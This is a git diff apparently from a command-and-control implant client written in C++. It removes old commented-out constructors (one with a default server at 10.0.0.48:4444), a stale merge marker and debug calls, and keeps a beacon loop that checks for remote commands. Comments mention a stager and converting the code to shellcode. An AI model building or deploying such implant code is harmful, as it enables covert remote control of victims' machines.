@@ -7,8 +7,6 @@
 
 // TODO: eventually convert to c code then asm then shell code?
 
-//#include "stager.h"
-
 
 #include "Client.h"
 #include "ComponentFactory.h"
@@ -18,21 +16,6 @@
 
 
 
-/*
-Client::Client() : 
-	transportLayer_(messageHandler_, "10.0.0.48", "4444") // Default server address
-{
-	messageHandler_.setTransportLayer(transportLayer_);
-}
-
-Client::Client(TCPtransportLayer transportLayer, std::string server, std::string port) : // TODO: transporter parameter isn't used 
-	transportLayer_(messageHandler_, server, port)
-{
-	messageHandler_.setTransportLayer(transportLayer_);
-}*/
-
-
-// TODO: delete?
 Client::Client() :
 	messageHandler_(),
 	transportLayerPtr_(
@@ -70,27 +53,10 @@ Client::Client(
 			encoderType,
 			encryptorType)
 	)
-{}
-/*
-Client::Client() :
->>>>>>> 57908ee250d5f635af889a6bc389567a4b68d2ad
-	messageHandler_(),
-	transportLayerPtr_(
-		TransportLayerFactory::create(
-			messageHandler_,
-			host,
-			port,
-			transportType,
-			serializerType,
-			encoderType,
-			encryptorType
-		)
-	)
 {
 	messageHandler_.setTransportLayer(*transportLayerPtr_);
-	std::cout << "inside parameter constructor for client" << std::endl;
 }
-*/
+
 Client::~Client()
 {
 	std::cout << "Client being deconstructed" << std::endl;
@@ -124,7 +90,6 @@ bool Client::run()
 		
 		if (transportLayerPtr_->isConnected())
 		{
-			transportLayerPtr_->testMessage();
 			transportLayerPtr_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
 			//transporter_.receive();
 			//transporter_.sendMessage();
